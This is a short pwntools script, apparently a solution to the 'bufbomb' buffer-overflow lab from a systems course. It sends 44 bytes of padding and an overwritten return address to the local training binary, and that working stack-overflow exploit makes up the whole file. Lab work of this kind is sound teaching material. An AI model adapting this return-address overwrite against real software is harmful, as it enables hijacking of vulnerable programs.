from pwn import *

f = open("./ID", "r")
id = f.read().splitlines()[0]
f.close()

sh = process(['./bufbomb', '-u', id])

length = 32
ret = 0x08048c90

exploit = flat(['a' * (length + 12), ret])

print ' '.join(char.encode("hex") for char in exploit)

sh.sendline(exploit)

sh.interactive()
